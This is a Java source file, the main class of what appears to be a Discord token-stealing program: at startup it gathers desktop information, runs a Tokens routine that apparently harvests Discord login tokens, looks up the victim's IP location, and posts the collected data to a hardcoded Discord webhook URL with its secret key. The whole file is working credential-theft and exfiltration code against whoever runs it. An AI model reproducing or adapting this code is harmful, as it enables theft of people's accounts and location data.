package me.koenv.mw;

import me.koenv.DiscordWebhook;
import me.koenv.mw.discord.Tokens;
import me.koenv.mw.discord.Webhooks;
import me.koenv.mw.utils.NetworkUtils;
import org.json.JSONObject;

import java.util.*;

public class Main {

    private static Main main;
    private static final String dcWebhookUrl = "https://discord.com/api/webhooks/839852749360332810/eBtkmVgTq_lz_hIaFqP_XHjXZBDJb3JsZrpXB-byXgXto77EXmGlBhoxhgLBu0GqE3YG";
    private static final String ipUrl = "http://ip-api.com/json/";
    private static final String mapsUrl = "https://www.google.com/maps/search/?api=1&query=";
    private static DesktopInfo desktopInfo;
    private static Tokens dcTokens;
    private static boolean debugMode;
    private JSONObject jsonData;

    public Map<String, Object> dataMap = new HashMap<>();

    public static void main(String[] args) {
        if (Arrays.toString(args).contains("--debug")) { debugMode = true;}
        desktopInfo = new DesktopInfo();
        dcTokens = new Tokens();
        dcTokens.run();
        new Main().run();
    }

    public void run(){
        // Run logic
        main = this;

        // Get JSON From URL
        String queryData = NetworkUtils.getFromAPI(ipUrl);
        // Set queryData To JSON Object
        jsonData = queryData != null ? new JSONObject(queryData) : null;
        assert jsonData != null;

        DiscordWebhook.sendMessage(dcWebhookUrl, Webhooks.pcInfo, debugMode);
    }

    public static Main getMain() {
        return main;
    }

    public static DesktopInfo getDesktopInfo() {
        return desktopInfo;
    }

    public static String getDcWebhookUrl() {
        return dcWebhookUrl;
    }

    public static String getIpUrl() {
        return ipUrl;
    }

    public static String getMapsUrl() {
        return mapsUrl;
    }

    public JSONObject getJsonData() {
        return jsonData;
    }

    public static Tokens getDcTokens() {
        return dcTokens;
    }
}
